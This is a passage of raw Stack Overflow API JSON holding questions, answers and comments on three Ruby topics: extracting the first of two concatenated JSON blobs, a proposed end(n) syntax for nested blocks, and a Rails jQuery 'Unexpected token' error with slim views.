"body": "Are you assuming a regular expression must be used to obtain the desired result or are you only interested in methods that employ a regular expression? If the former, you have descirbed a so-called <a href=\"http://xyproblem.info/\" rel=\"nofollow noreferrer\">X-Y Problem</a>, as the use of a regex is just one approach here."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511905556, "post_id": 47533887, "comment_id": 82040083, "body": "As written, the braces in <code>}{</code> are not separated by a space (or any other character). May there be spaces? If so, how many?"}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511905958, "post_id": 47533887, "comment_id": 82040261, "body": "As an aside, if you give names to your example&#39;s input objects (e.g., <code>str = &#39;{&quot;a&quot;: 1, &quot;b&quot;: {...}}{&quot;x&quot;: 2, &quot;y&quot;: 3}&#39;</code>) readers can refer to those variables (<code>str</code>) in comments and answers without having to define them."}], "answers": [{"comments": [{"owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "edited": false, "score": 0, "creation_date": 1511881665, "post_id": 47534752, "comment_id": 82026239, "body": "oh crap!! youre right. I tried thinking of a split situation and totally didn&#39;t even think o fthat. I can just check for <code>}{</code>"}, {"owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "edited": false, "score": 0, "creation_date": 1511881696, "post_id": 47534752, "comment_id": 82026260, "body": "It&#39;s super dirty, not something I would use in production in case one of the other values contains <code>}{</code> but for this purpose I think this will be fine"}], "tags": [], "owner": {"reputation": 9971, "user_id": 8255744, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de22299534b5a8ed244ee8ff4aa6c481?s=128&d=identicon&r=PG&f=1", "display_name": "Simple Lime", "link": "https://stackoverflow.com/users/8255744/simple-lime"}, "is_accepted": true, "score": 2, "last_activity_date": 1511881616, "creation_date": 1511881616, "answer_id": 47534752, "question_id": 47533887, "link": "https://stackoverflow.com/questions/47533887/ignoring-regex-at-end-of-string/47534752#47534752", "title": "Ignoring regex at end of string", "body": "<p>As far as I can think right now, you'll never have an open bracket next to a close bracket in JSON, so you might be able to get away with just a simple split:</p>\n\n<pre><code>source = '{\"a\": 1, \"b\": {\"c\": 2}}{\"x\": 2, \"y\": 3}'\njson = source.split(/(?&lt;=\\})\\s*\\{/)[0]\nJSON.parse(json)\n# =&gt; {\"a\"=&gt;1, \"b\"=&gt;{\"c\"=&gt;2}}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 1, "last_activity_date": 1511909882, "last_edit_date": 1511909882, "creation_date": 1511904508, "answer_id": 47541197, "question_id": 47533887, "link": "https://stackoverflow.com/questions/47533887/ignoring-regex-at-end-of-string/47541197#47541197", "title": "Ignoring regex at end of string", "body": "<p>You could use a regular expression, but it's more direct to just pull out the string you want.</p>\n\n<pre><code>str = '{\"a\": 1, \"b\": {\"c\": 2}}{\"x\": 2, \"y\": 3}'\n\ns = str[0, str.index('}{')]\n  #=&gt; \"{\\\"a\\\": 1, \\\"b\\\": {\\\"c\\\": 2}\"\n\nputs s\n  #=&gt; {\"a\": 1, \"b\": {\"c\": 2}\n</code></pre>\n\n<p>Here I've assumed that, as in the example, there are no spaces between the braces in <code>'}{'</code>. If there may be zero or more spaces, as here:</p>\n\n<pre><code>str = '{\"a\": 1, \"b\": {\"c\": 2}}   {\"x\": 2, \"y\": 3}'\n</code></pre>\n\n<p>use the following (which, alas, uses a regex, albeit a simple one):</p>\n\n<pre><code>puts str[0, str.index(/\\} *\\{/)]\n  #=&gt; {\"a\": 1, \"b\": {\"c\": 2}\n</code></pre>\n"}], "owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 47534752, "answer_count": 2, "score": 0, "last_activity_date": 1511909882, "creation_date": 1511879029, "last_edit_date": 1511881446, "question_id": 47533887, "link": "https://stackoverflow.com/questions/47533887/ignoring-regex-at-end-of-string", "title": "Ignoring regex at end of string", "body": "<p>I have an invalid JSON response like this:</p>\n\n<pre><code>{\"a\": 1, \"b\": {...}}{\"x\": 2, \"y\": 3}\n</code></pre>\n\n<p>I'm unable to fix the source, so I have to fix it on my end.</p>\n\n<p>I want to extract out only this JSON chunk: <code>{\"a\": 1, \"b\": {...}}</code></p>\n\n<p>It's because it's appending a second chunk of metadata JSON <code>{\"x\": 2, \"y\": 3}</code> that I want to ignore.</p>\n\n<p>How do I format my regex to either</p>\n\n<p>a) only take the first JSON blob (up until the space right before the last <code>{</code>)</p>\n\n<p>b) strip out the last JSON chunk (I would say look for the last <code>{</code> in the string so I can split right before it.</p>\n\n<p>Method B is probably easiest</p>\n"}, {"tags": ["ruby", "nested"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 2, "creation_date": 1511874351, "post_id": 47532308, "comment_id": 82021016, "body": "That&#39;s not possible, thank god. In fact, this is not possible in every single language I heard of."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511874416, "post_id": 47532308, "comment_id": 82021057, "body": "If you need that, you have serious nesting problems. And chaining ends is the least of your concerns :)"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 2, "creation_date": 1511874457, "post_id": 47532308, "comment_id": 82021083, "body": "Also clarify, &quot;efficient&quot; in what terms?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511874593, "post_id": 47532308, "comment_id": 82021195, "body": "@SergioTulentsev or course it\u2019s possible; the whole code should be a string, surrounded with <code>eval</code> and ending with <code>([&#39;end&#39;]*100).join(&#39;;&#39;)</code>."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511874633, "post_id": 47532308, "comment_id": 82021221, "body": "@mudasobwa: well, except that :)"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1511874671, "post_id": 47532308, "comment_id": 82021247, "body": "<code>python</code> background detected :)"}, {"owner": {"reputation": 319, "user_id": 7661188, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-msXBf4I0Obo/AAAAAAAAAAI/AAAAAAAAAMk/kLVJCnnUjas/photo.jpg?sz=128", "display_name": "azbc", "link": "https://stackoverflow.com/users/7661188/azbc"}, "edited": false, "score": 0, "creation_date": 1511874854, "post_id": 47532308, "comment_id": 82021383, "body": "@Tulentsev - Efficient in the sense not to have to write out a thousand and one times &quot;end&quot;, or having to count them all."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 3, "creation_date": 1511874999, "post_id": 47532308, "comment_id": 82021501, "body": "@azbc: some <a href=\"https://news.ycombinator.com/item?id=3414637\" rel=\"nofollow noreferrer\">high-profile coders assert that even more than 3 levels of indentation is a problem</a>. 1000 levels - not even god can help you, if you write that by hand. And with code generation it&#39;s a non-issue."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1511875010, "post_id": 47532308, "comment_id": 82021512, "body": "One should not nest blocks more than two levels in the first place. If the code has a thousand levels of nesting, it should be immediately trashed."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1511875079, "post_id": 47532308, "comment_id": 82021558, "body": "Having 1,000 <code>end</code>s implies that you have 1,000 <code>if</code>s and that your innermost <code>if</code> is indented by 2,000 spaces."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1511875214, "post_id": 47532308, "comment_id": 82021650, "body": "@Stefan: <i>assuming</i> standard 2-space indentation and not something bigger :)"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511875540, "post_id": 47532308, "comment_id": 82021889, "body": "@azbc: but if you don&#39;t count them all, how do you know <b>what number to put</b> in <code>.end(x)</code>? &#175;\\_(\u30c4)_/&#175;"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511875686, "post_id": 47532308, "comment_id": 82022005, "body": "@azbc: also, how do you make sure to not forget to decrement <code>.end(x)</code> when you take out one of the blocks?"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511876820, "post_id": 47532308, "comment_id": 82022773, "body": "RE your edit: by all means, give it a go. Who knows, maybe it will turn out to be the next big thing since sliced bread!"}, {"owner": {"reputation": 2470, "user_id": 1175090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/bd5ca9726b8546e77c9fe21cae2f1e95?s=128&d=identicon&r=PG", "display_name": "Snake Sanders", "link": "https://stackoverflow.com/users/1175090/snake-sanders"}, "edited": false, "score": 0, "creation_date": 1511877319, "post_id": 47532308, "comment_id": 82023118, "body": "Sadly you want something like Python"}], "answers": [{"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511875416, "post_id": 47532654, "comment_id": 82021799, "body": "That&#39;s a good point. Who even <i>writes</i> <code>end</code> manually these days? My editor inserts them for me (and keeps an eye on the balancing)"}], "tags": [], "owner": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "is_accepted": false, "score": 1, "last_activity_date": 1511875465, "last_edit_date": 1511875465, "creation_date": 1511875301, "answer_id": 47532654, "question_id": 47532308, "link": "https://stackoverflow.com/questions/47532308/how-efficiently-end-nested-blocks-in-ruby/47532654#47532654", "title": "How efficiently end nested blocks in Ruby?", "body": "<p>No, That is a violation of basic ruby syntax and will fail in the parser level itself. And it is not about efficiency, you won't get any meaningful performance boost by doing that. If you meant the extra effort to write end after end of the each block, use plugin for doing that in your favourite text editor</p>\n\n<p>Note,\nIf your code is too much nested, then that is probably a code smell</p>\n"}, {"tags": [], "owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "is_accepted": false, "score": 0, "last_activity_date": 1511877708, "creation_date": 1511877708, "answer_id": 47533409, "question_id": 47532308, "link": "https://stackoverflow.com/questions/47532308/how-efficiently-end-nested-blocks-in-ruby/47533409#47533409", "title": "How efficiently end nested blocks in Ruby?", "body": "<blockquote>\n  <p>Would it be seriously possible to have this feature ? <code>end(value)</code> ?</p>\n</blockquote>\n\n<p>Of course, everything is possible, given enough determination. Although, there is a reason why no single language has this. The reason being that in practice nobody writes a thousand nested ifs, so such a feature has negligible practical benefit, while being <em>extremely</em> costly in implementation and understanding. </p>\n\n<p>For example, you suggested that putting a number not big enough in <code>end(x)</code> would ignore all blocks, whose nesting is larger than that. That is a language I wouldn't touch with a mile-long pole. Either my code all works or it fails to parse.</p>\n\n<p>But there are languages with no <code>end</code> at all, where nesting is controlled by indentation. Like python or coffeescript. So if you're bothered by writing out ends and your editor doesn't help, you could try using those. You'll still have to keep a really close eye on what level of indentation you're typing the code currently. Same coin, different side.</p>\n"}, {"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511879286, "post_id": 47533949, "comment_id": 82024509, "body": "&quot;fold up&quot; syntax \ud83d\ude08"}, {"owner": {"reputation": 319, "user_id": 7661188, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-msXBf4I0Obo/AAAAAAAAAAI/AAAAAAAAAMk/kLVJCnnUjas/photo.jpg?sz=128", "display_name": "azbc", "link": "https://stackoverflow.com/users/7661188/azbc"}, "edited": false, "score": 0, "creation_date": 1511889941, "post_id": 47533949, "comment_id": 82031794, "body": "To immediately dismiss this as a &quot;TERRIBLE LANGUAGE DESIGN&quot; is a bit harsh, isn&#39;t it ? The design attempt is actually having it dimensionally better structured, by finding something to omit al these branches. Well, maybe I am not intelligent enough."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 319, "user_id": 7661188, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-msXBf4I0Obo/AAAAAAAAAAI/AAAAAAAAAMk/kLVJCnnUjas/photo.jpg?sz=128", "display_name": "azbc", "link": "https://stackoverflow.com/users/7661188/azbc"}, "edited": false, "score": 2, "creation_date": 1511890607, "post_id": 47533949, "comment_id": 82032224, "body": "@azbc With respect, I did not &quot;immediately dismiss it&quot;. I even provided you with some research on how others have considered it before, and other proposed forms of syntax."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511890762, "post_id": 47533949, "comment_id": 82032320, "body": "If you follow that link, you&#39;ll also find an MRI implementation of the <code>ennnnd</code> syntax. Which essentially answers your question of &quot;yes, it is possible&quot;. (If you add it to the core language parser.)"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511890852, "post_id": 47533949, "comment_id": 82032359, "body": "My point around &quot;terrible design&quot; is primarily because this is a &quot;pointless&quot; feature. If your code is only nested e.g. 2 layers deep, then <code>end(2)</code> doesn&#39;t help very much; meanwhile if your code is e.g. 100 layers deep then you have bigger problems!"}, {"owner": {"reputation": 319, "user_id": 7661188, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-msXBf4I0Obo/AAAAAAAAAAI/AAAAAAAAAMk/kLVJCnnUjas/photo.jpg?sz=128", "display_name": "azbc", "link": "https://stackoverflow.com/users/7661188/azbc"}, "edited": false, "score": 1, "creation_date": 1511893354, "post_id": 47533949, "comment_id": 82033749, "body": "@Tom Lord - yes, sorry, that is not nice of me to say, indeed you provide me with a lot of help, thank you :)"}], "tags": [], "owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "is_accepted": true, "score": 3, "last_activity_date": 1511879192, "creation_date": 1511879192, "answer_id": 47533949, "question_id": 47532308, "link": "https://stackoverflow.com/questions/47532308/how-efficiently-end-nested-blocks-in-ruby/47533949#47533949", "title": "How efficiently end nested blocks in Ruby?", "body": "<p>I'm not aware of <em>any</em> language where this is a feature. It would, in my opinion, make for a terrible language design.</p>\n\n<p>It sounds like you're coming from a <code>python</code> background, which is (unlike ruby) whitespace-sensitive. Arguing for <em>that</em> as a desirable language feature has some merit, but is not something that will ever be built into ruby at this point.</p>\n\n<hr>\n\n<p>Interestingly, you're not the first person to come up with this idea. <a href=\"https://bugs.ruby-lang.org/issues/5054\" rel=\"nofollow noreferrer\">Here's an amusing (joke/rejected) ruby feature request from a few years ago</a>:</p>\n\n<pre><code>module MyModule\n  class MyClass\n    def my_method\n      10.times do\n        if rand &lt; 0.5 \n          p :small\n        ennnnnd\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code> module MyModule\n   class MyClass\n     def my_method\n       10.times do\n         if rand &lt; 0.5\n           p :small\n eeeeeeeeend\n         ^^^ &lt;- same place of original \"end\"!\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>module MyModule\n  class MyClass\n    def my_method\n      10.times do\n        if rand &lt; 0.5 \n          p :small\nendmodule\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>module MyModule\n   class MyClass\n     def my_method\n       10.times do\n         if rand &lt; 0.5\n           p :small\nend!\n</code></pre>\n\n<p>Or perhaps instead this should be \"fold up\" syntax:</p>\n\n<pre><code>module MyModule\n  class MyClass\n    def my_method\n      10.times do\n        if rand &lt; 0.5 \n          p :small\nfuuuuu\n</code></pre>\n"}], "owner": {"reputation": 319, "user_id": 7661188, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-msXBf4I0Obo/AAAAAAAAAAI/AAAAAAAAAMk/kLVJCnnUjas/photo.jpg?sz=128", "display_name": "azbc", "link": "https://stackoverflow.com/users/7661188/azbc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 195, "favorite_count": 0, "accepted_answer_id": 47533949, "answer_count": 3, "score": -1, "last_activity_date": 1511911735, "creation_date": 1511874193, "last_edit_date": 1511911735, "question_id": 47532308, "link": "https://stackoverflow.com/questions/47532308/how-efficiently-end-nested-blocks-in-ruby", "title": "How efficiently end nested blocks in Ruby?", "body": "<p>In Ruby a block is ended with the reserved word \"end\".\nAnd nested blocks need all their own end.</p>\n\n<pre><code>var_a = a\nvar_b = b\n\nif var_a\n  if var_b\n    ... do something\n  end\nend\n</code></pre>\n\n<p>It is shorter to write: <code>end(amount_of_ends_needed)</code>:</p>\n\n<pre><code>if var_a\n  if var_b\n    ... do something\nend(2)\n</code></pre>\n\n<p>Is something like this possible in Ruby ? </p>\n\n<p>Edit:</p>\n\n<p>I see people are not in favor of this idea.\nHowever one argument is the use of a variable inside <code>end(some_value)</code>.</p>\n\n<pre><code>value = query\nif var_a\n  if var_b\n    ... do something\nend(value)\n</code></pre>\n\n<p>And have a dynamic amount of nesting.\nBy cutting the nested blocks that are superfluous.</p>\n\n<p>I found this on another page:\n<a href=\"https://stackoverflow.com/questions/3680097/ruby-multiline-block-without-do-end\">Ruby multiline block without do end</a> , at the bottom of the page is a link to <a href=\"https://github.com/michaeledgar/seamless\" rel=\"nofollow noreferrer\">seamless</a></p>\n\n<blockquote>\n  <p>Python allows you to signal the end of a code block with indentation. Ruby suffers from an extremely verbose and tedious block terminator, \"end\". Much like Lisps end up with dozens of close-parens, Ruby files that use modules and classes heavily end up with a plethora of \"ends\" that just aren't necessary.\n  Write a Ruby file, but skip all the \"ends\". Line up your code blocks like in Python. Then just call it 'your_file.rbe', require 'seamless', and require 'your_file'. Seamless does the rest.\n  Should this ever see widespread use? I don't know. But it's pretty fun!</p>\n</blockquote>\n"}, {"tags": ["javascript", "jquery", "ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 2537, "user_id": 5371321, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/ZFyVo.jpg?s=128&g=1", "display_name": "Narasimha Reddy - Geeker", "link": "https://stackoverflow.com/users/5371321/narasimha-reddy-geeker"}, "edited": false, "score": 0, "creation_date": 1511874021, "post_id": 47532155, "comment_id": 82020825, "body": "try this <code>$(&#39;#photos&#39;).html(&quot;&lt;%= escape_javascript render(&#39;photos_list&#39;) %&gt;&quot;)</code>"}, {"owner": {"reputation": 1515, "user_id": 7189767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c979c9b4f88620e8ddbf74fb6a83824?s=128&d=identicon&r=PG&f=1", "display_name": "Fallenhero", "link": "https://stackoverflow.com/users/7189767/fallenhero"}, "reply_to_user": {"reputation": 2537, "user_id": 5371321, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/ZFyVo.jpg?s=128&g=1", "display_name": "Narasimha Reddy - Geeker", "link": "https://stackoverflow.com/users/5371321/narasimha-reddy-geeker"}, "edited": false, "score": 0, "creation_date": 1511874612, "post_id": 47532155, "comment_id": 82021203, "body": "@NarasimhaReddy: <code>j</code> is the short-hand for <code>escape_javascript</code>"}, {"owner": {"reputation": 2537, "user_id": 5371321, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/ZFyVo.jpg?s=128&g=1", "display_name": "Narasimha Reddy - Geeker", "link": "https://stackoverflow.com/users/5371321/narasimha-reddy-geeker"}, "edited": false, "score": 0, "creation_date": 1511874731, "post_id": 47532155, "comment_id": 82021300, "body": "Oh am sorry, i never knew this. Thanks for info. @alberto montalesi"}, {"owner": {"reputation": 2374, "user_id": 115192, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Nsobz.jpg?s=128&g=1", "display_name": "gernberg", "link": "https://stackoverflow.com/users/115192/gernberg"}, "edited": false, "score": 0, "creation_date": 1511877030, "post_id": 47532155, "comment_id": 82022905, "body": "How does your view for destroy look?"}, {"owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1511883704, "post_id": 47532155, "comment_id": 82027657, "body": "check the response using your browser&#39;s inspector, maybe you have some error serverside and it&#39;s responding with an error page"}, {"owner": {"reputation": 807, "user_id": 2651076, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/3274dc805ba25f33023bee2a4d32d6d9?s=128&d=identicon&r=PG&f=1", "display_name": "Sinstein", "link": "https://stackoverflow.com/users/2651076/sinstein"}, "edited": false, "score": 0, "creation_date": 1511887167, "post_id": 47532155, "comment_id": 82030077, "body": "Can you add what you see as response in the network tab of your browser?"}, {"owner": {"reputation": 2347, "user_id": 1625253, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/iBQwX.jpg?s=128&g=1", "display_name": "Simon Franzen", "link": "https://stackoverflow.com/users/1625253/simon-franzen"}, "edited": false, "score": 0, "creation_date": 1520172958, "post_id": 47532155, "comment_id": 85197613, "body": "add layout =&gt; false like described here <a href=\"https://stackoverflow.com/questions/40943533/why-do-i-need-render-layout-false-in-my-rails-controller-action#40943751\" title=\"why do i need render layout false in my rails controller action%2340943751\">stackoverflow.com/questions/40943533/&hellip;</a>"}], "owner": {"reputation": 639, "user_id": 8012134, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/x71GR.jpg?s=128&g=1", "display_name": "alberto montalesi", "link": "https://stackoverflow.com/users/8012134/alberto-montalesi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 859, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1511959791, "creation_date": 1511873743, "last_edit_date": 1511959791, "question_id": 47532155, "link": "https://stackoverflow.com/questions/47532155/rails-jquery-unexpected-token", "title": "Rails jQuery Unexpected Token &quot;&lt;&quot;", "body": "<p>My code is </p>\n\n<p><strong>app/views/rooms/photo_upload.html.slim</strong></p>\n\n<pre><code>.panel-body\n    .container\n      .row\n        .col-md-offset-3.col-md-6\n          = form_for @room, url: room_photos_path(@room), method: \"post\", html: {multipart: true} do |f|\n            .row\n              .form-group\n                span.btn.btn-default.btn-file.text-babu \n                  i.fa.fa-cloud-upload aria-hidden='true'\n                  |  Select Photos\n\n                  = file_field_tag \"images[]\", type: :file, multiple: true\n            .text-center\n              = f.submit \"Add Photos\", class:\"btn btn-form\"\n    #photos\n      = render \"photos/photos_list\"\n</code></pre>\n\n<p><strong>app/views/photos/_photos_list.html.slim</strong></p>\n\n<pre><code>  - if @photos.count &gt; 0 \n  br/\n  br/\n  .row\n    - @photos.each do |photo|\n      .col-md-4\n        .panel.panel-default  \n          .panel-heading.preview\n            = 